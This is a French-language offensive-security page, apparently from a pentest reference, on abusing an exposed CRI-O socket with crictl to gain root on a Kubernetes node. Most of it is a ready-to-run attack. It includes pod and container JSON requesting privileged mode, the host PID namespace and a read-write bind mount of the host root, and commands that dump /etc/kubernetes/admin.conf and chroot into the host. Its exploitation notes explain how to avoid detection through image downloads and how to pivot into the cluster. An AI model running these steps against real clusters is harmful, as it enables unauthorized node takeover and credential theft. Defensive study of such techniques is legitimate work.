---
title: "Socket CRI-O : contrôle du nœud via crictl"
description: "CRI-O expose son API de contrôle sur un socket Unix protégé uniquement par les permissions du système de fichiers. Un processus capable de l'atteindre pilote CRI-O avec crictl pour énumérer les pods et les images et pour créer un pod privilégié qui monte en bind le système de fichiers racine du nœud, prenant le contrôle du nœud Kubernetes de la même manière que le socket containerd."
keywords:
  - cri-o socket
  - crictl
  - kubernetes node
  - privileged pod
  - node takeover
---

# Socket CRI-O

CRI-O est l'autre runtime de nœud Kubernetes courant, et son socket de contrôle (`/run/crio/crio.sock`) est, comme celui de containerd, protégé uniquement par les permissions du système de fichiers. Un processus capable d'y écrire contrôle CRI-O via le CRI, et peut définir un pod privilégié qui monte le système de fichiers racine du nœud, donnant les droits root sur le nœud. Le client standard est `crictl`, qui parle le CRI avec n'importe quel point de terminaison de runtime vers lequel il est pointé.

Confirmez l'accès et énumérez :

```bash
export CONTAINER_RUNTIME_ENDPOINT=unix:///run/crio/crio.sock
ls -l /run/crio/crio.sock
crictl version; crictl info | head
crictl pods; crictl images | head; crictl ps -a
```

## Prise de contrôle du nœud

`crictl` crée un conteneur à partir d'un bac à sable de pod ; le JSON du pod et du conteneur demande le mode privilégié et un montage en bind de la racine de l'hôte :

```bash
cat > pod.json <<'J'
{ "metadata": {"name":"esc","namespace":"default","uid":"esc"},
  "linux": {"security_context": {"privileged": true, "namespace_options": {"network":2,"pid":1}}} }
J
cat > ctr.json <<'J'
{ "metadata": {"name":"esc"},
  "image": {"image":"docker.io/library/alpine:latest"},
  "command": ["/bin/sh","-c","cat /host/etc/kubernetes/admin.conf; chroot /host sh -c id"],
  "mounts": [{"container_path":"/host","host_path":"/","readonly":false}],
  "linux": {"security_context": {"privileged": true}} }
J
pod=$(crictl runp pod.json)
cid=$(crictl create $pod ctr.json pod.json)
crictl start $cid && crictl logs $cid
```

Le montage de la racine de l'hôte dans `/host` expose les informations d'authentification du kubelet et les secrets du nœud, le même matériel de pivot vers le cluster que la voie containerd.

## Notes d'exploitation

- Comme containerd, le socket n'est pas authentifié ; la permission sur le socket est le verrou. Pointez `crictl` vers le point de terminaison avec `--runtime-endpoint` ou la variable d'environnement.
- Demandez l'espace de noms PID de l'hôte et le mode privilégié dans le contexte de sécurité pour que le conteneur soit non confiné ; c'est le montage en bind de `/` qui transporte les fichiers du nœud.
- Réutilisez une image déjà présente sur le nœud (`crictl images`) pour éviter un téléchargement. La suite est identique à la voie du [socket containerd](containerd-socket.md) : lire les informations d'authentification du nœud et pivoter vers le cluster.

## Références

- [crictl user guide](https://github.com/kubernetes-sigs/cri-tools/blob/master/docs/crictl.md)
- [CRI-O documentation](https://github.com/cri-o/cri-o/tree/main/docs)
- [Kubernetes: CRI](https://kubernetes.io/docs/concepts/architecture/cri/)
